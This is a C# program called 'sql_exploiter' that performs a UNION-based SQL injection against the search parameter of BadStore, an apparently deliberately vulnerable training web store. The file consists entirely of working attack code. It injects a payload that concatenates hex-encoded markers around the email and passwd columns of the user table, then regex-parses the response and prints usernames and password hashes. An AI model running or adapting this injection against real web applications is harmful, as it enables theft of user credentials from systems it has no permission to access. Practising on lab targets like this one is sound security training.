using System;
using System.Linq;
using System.Net;
using System.IO;
using System.Text.RegularExpressions;


namespace sql_exploiter
{
    class MainClass
    {
        public static void Main(string[] args)
        {
            string frontMarker = "FrOnTMaRker";
            string middleMarker = "mIdDlEMaRker";
            string endMarker = "eNdMaRker";
            string frontHex = string.Join("", frontMarker.Select(c => ((int)c).ToString("X2")));
            string middleHex = string.Join("", middleMarker.Select(c => ((int)c).ToString("X2")));
            string endHex = string.Join("", endMarker.Select(c => ((int)c).ToString("X2")));

            string url = "http://" + args[0] + "/cgi-bin/badstore.cgi";
            string payload = "test' UNION ALL SELECT";
            payload += " NULL, NULL, NULL, CONCAT(0x" + frontHex + ", IFNULL(CAST(email AS";
            payload += " CHAR), 0x20),0x" + middleHex + ", IFNULL(CAST(passwd AS";
            payload += " CHAR), 0x20), 0x" + endHex + ") FROM badstoredb.userdb-- ";

            url += "?searchquery=" + Uri.EscapeUriString(payload) + "&action=search";

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create (url);
            string response = string.Empty;
            using (StreamReader reader = new StreamReader(request.GetResponse().GetResponseStream()))
                response = reader.ReadToEnd();

            Regex payloadRegex = new Regex(frontMarker + "(.*?)" + middleMarker + "(.*?)" + endMarker);
            MatchCollection matches = payloadRegex.Matches(response);
            foreach (Match match in matches)
            {
                Console.WriteLine("Username: " + match.Groups[1].Value + "\t");
                Console.Write("Password hash: " + match.Groups[2].Value);
            }
        }
    }
}
